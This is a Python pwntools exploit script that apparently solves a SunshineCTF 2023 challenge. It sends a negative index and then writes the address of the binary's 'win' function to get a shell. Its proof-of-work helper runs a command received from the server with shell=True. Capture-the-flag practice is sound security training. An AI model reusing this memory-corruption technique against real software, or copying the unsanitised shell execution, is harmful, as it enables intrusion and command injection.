#!/usr/bin/env python3
from pwn import *
import subprocess

elf = ELF("./sunsihe_patched")

context.binary = elf
NULL = 0x0

'''
    #######################################
    #  REST AT THE END NOT IN THE MIDDLE  #
    #######################################
'''


def conn():
    global p, ssh_conn
    ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
    if args.FLAG:
        running = log.progress("Createing the flag...")
        try:
            os.system("echo 'PWN{a_placeholder_32byte_flag}' > flag.txt")
            running.success()
        except:
            running.failure()
    if args.REMOTE:
        p = remote("chal.2023.sunshinectf.games", 23003)
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        p = sshc.process([ssh_conn[4]])
    else:
        p = process([elf.path])
        if args.GDB:
            gdb.attach(p,'''
                b basket
                ''')
        if args.PATCH:
            elf.asm(elf.symbols['alarm'], 'ret')
            elf.save([elf.path])
    return p

def get_one_gadget(filename: str, base_address=NULL) -> int:
    return [i + base_address for i in [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]]

def solve_poc(p):
    p.recvuntil(b"work: ")
    cmd = p.recvline()
    proc = log.progress(f"solving POC")

    try:
        solve = subprocess.check_output(cmd, shell=True, text=True).strip()
        proc.success("Done")
    except:
        proc.failure("Error")
        exit(-1)

    log.info(f"solve @ {solve}")
    p.sendline(solve.encode('utf-8'))

def main():
    with conn() as p:
        win = elf.symbols['win']

        p.sendlineafter(b">>> ", b"-8")
        p.sendlineafter(b">>>", p64(win))

        p.interactive()


if __name__ == "__main__":
    main()
